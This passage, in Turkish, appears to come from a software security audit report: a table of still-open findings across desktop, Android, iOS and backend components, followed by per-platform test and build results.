| O-7, O-13, O-14, O-19, O-20, O-21, O-22, O-23 | **Açık** — MCP `environment` sırları, `settings.json` sır filtresi, yerel `llama-server` API anahtarı, CDP port parola koruması, `.mem` koruma regex'i, SSH izinleri, sır tespiti. |
| O-8, O-9, O-10, O-18, O-24 | **Açık** — bubblewrap kök bağlama, `cmd.exe` tırnaklama, uzak OAuth URL şeması, `ExtraArgs` beyaz listesi, paketleme checksum. |
| O-25 … O-30 (Android) | **Açık** — WebView sertleştirme, Keystore biyometrik, sertifika sabitleme, Rhino komut limiti, `preview_tunnel` allowlist. |
| O-25/iOS-22, I-6 … I-16 (iOS) | **Açık** — clipboard, JSContext limiti, biyometrik kapı, ReDoS. |
| D-1 … D-30 (düşük) | **Açık** — çoğu savunma derinliği. |
| WebView2 / macOS `dlopen` doğrulama | **Açık** — mimari değişiklik gerektiriyor (ayrı süreç). |

## Doğrulama durumu

| Platform | Sonuç |
|---|---|
| Windows/Linux (C#) | `dotnet test` → **551/551 geçti** (4 yeni güvenlik regresyon testi dahil). |
| macOS (Swift) | `swift build` temiz. `swift test` → 895 test, **11 hata** — hepsi denetim öncesinden gelen, kullanıcının WIP değişikliklerine ait (`ConversationStore`, `MediaExport`, `WorkspaceReadWrite`, `AgentBridge`, `ConcurrentRuns`, `HerNessPrompt`, `SandboxAppModel`). 5 yeni güvenlik testi geçti. |
| iOS | `swiftc -parse` temiz. |
| Android | `gradle :app:compileDebugKotlin` → BUILD SUCCESSFUL. |
| Backend | `tsc --noEmit` temiz. |
| Localization | `check_localization.py --check` → "localization in sync". |
